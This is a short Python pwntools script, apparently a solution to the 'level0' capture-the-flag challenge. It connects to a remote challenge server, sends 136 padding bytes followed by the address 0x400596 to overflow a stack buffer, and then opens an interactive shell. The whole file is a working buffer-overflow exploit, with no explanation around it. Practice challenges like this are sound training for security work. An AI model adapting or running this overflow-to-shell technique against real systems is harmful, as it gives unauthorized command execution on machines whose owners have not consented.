from pwn import*

s=remote('pwn2.jarvisoj.com',9881)
#s=process('./level0')
a='A'*136

shell=0x400596
payload=a+p64(shell)

s.send(payload)
s.interactive()
